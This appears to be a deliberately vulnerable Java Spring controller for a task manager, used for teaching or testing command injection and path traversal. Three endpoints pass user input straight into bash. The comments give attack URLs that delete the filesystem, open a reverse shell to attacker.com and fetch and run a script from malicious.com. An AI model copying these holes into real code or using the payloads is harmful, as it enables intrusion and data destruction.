package com.example.taskmanager;

import org.springframework.web.bind.annotation.*;
import java.io.*;
import java.util.Arrays;

@RestController
@RequestMapping("/tasks")
public class TaskCommandController {
    
    private static final String TASK_DIR = "/var/tasks/";
    
    /**
     * 模拟任务执行接口（存在命令注入漏洞）
     * 攻击示例：curl "http://localhost:8080/tasks/execute?taskName=backup.sh;rm%20-rf%20/*"
     */
    @GetMapping("/execute")
    public String executeTask(@RequestParam String taskName) {
        try {
            // 漏洞点：直接拼接用户输入到命令中
            ProcessBuilder pb = new ProcessBuilder(
                Arrays.asList("/bin/bash", "-c", "sh " + TASK_DIR + taskName)
            );
            Process process = pb.start();
            
            // 读取命令输出
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\
");
            }
            return output.toString();
            
        } catch (Exception e) {
            return "Error executing task: " + e.getMessage();
        }
    }
    
    /**
     * 任务日志查看接口（二次注入漏洞）
     * 攻击示例：curl "http://localhost:8080/tasks/logs?filename=../../etc/passwd;nc%20-e%20/bin/sh%20attacker.com%204444"
     */
    @GetMapping("/logs")
    public String viewLogs(@RequestParam String filename) {
        try {
            // 漏洞点：双重危险操作
            ProcessBuilder pb = new ProcessBuilder(
                Arrays.asList("/bin/bash", "-c", "cat /var/logs/tasks/" + filename)
            );
            Process process = pb.start();
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\
");
            }
            return output.toString();
            
        } catch (Exception e) {
            return "Error reading logs: " + e.getMessage();
        }
    }
    
    /**
     * 任务清理接口（路径遍历+命令注入）
     * 攻击示例：curl "http://localhost:8080/tasks/clean?dir=../../tmp;wget%20http://malicious.com/shell.sh%20&&%20sh%20shell.sh"
     */
    @PostMapping("/clean")
    public String cleanTasks(@RequestParam String dir) {
        try {
            // 漏洞点：组合使用用户输入
            ProcessBuilder pb = new ProcessBuilder(
                Arrays.asList("/bin/bash", "-c", "rm -rf /var/tasks/" + dir)
            );
            Process process = pb.start();
            
            // 等待命令执行完成
            int exitCode = process.waitFor();
            return "Cleanup completed with exit code: " + exitCode;
            
        } catch (Exception e) {
            return "Error cleaning tasks: " + e.getMessage();
        }
    }
}